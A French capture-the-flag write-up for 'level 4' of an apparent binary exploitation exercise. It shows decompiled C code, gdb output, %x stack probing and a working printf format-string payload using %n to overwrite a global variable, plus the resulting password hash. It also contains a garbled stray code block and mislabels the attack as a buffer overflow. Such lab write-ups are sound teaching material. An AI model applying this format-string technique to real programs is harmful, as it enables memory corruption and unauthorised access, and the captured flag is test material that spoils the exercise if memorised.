## LEVEL 4

# Le level 4 est quasi pareil que le level 3

En inspectant le code avec gdb, nous voyons que le programme appelle printf, mais directement avec la variable passe en argument. Il n'y a donc pas de formatage de la chaine de caractere. Et egalement, on se rends compte que le programme appelle system tout en affichant le .pass, si le m(pas encore initialise) est egal a 16930116

D'apres le man de printf: `Un code tel que printf(foo); indique souvent un bogue, car foo peut contenir un caractère « % ». Si foo vient d'une saisie non sécurisée, il peut contenir « %n », ce qui autorise printf() à écrire dans la mémoire, et crée une faille de sécurité.  `

```c
void n(void)

{
  char local_20c [520];

  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 16930116) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}
```

On peut donc deja trouver l'adresse de la variable m avec gdb

```
info variables

0x08049810  m
```

On peut exploiter le faire que printf ne reformate pas ce qu'on envoie pour faire une attaque de type buffer overflow.

```python
python -c 'print "iiii" + "%x | "*16' | ./level4
iiiib7ff26b0 | bffff794 | b7fd0ff4 | 0 | 0 | bffff758 | 804848d | bffff550 | 200 | b7fd1ac0 | b7ff37d0 | 69696969 | 7c207825 | 20782520 | 7825207c | 25207c20 |
```

Notre buffer est donc affiche en 12 eme position, on peut donc mettre exploiter le 12 eme % de printf avec %n pour ecrire dans la variable m. Sauf que le nombre de caractere a ecrire est trop grand, donc on doit juste utiliser le %<number>d pour ecrire le nombre de caractere qu'on veut.

```python
python -c 'print "\x10\x98\x04\x08"+"i"
Wait what?!
```

On peut maintenant juste maintenir la connexion avec le shell et faire un cat sur le fichier contenant le mot de passe.

```python
python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
...
```
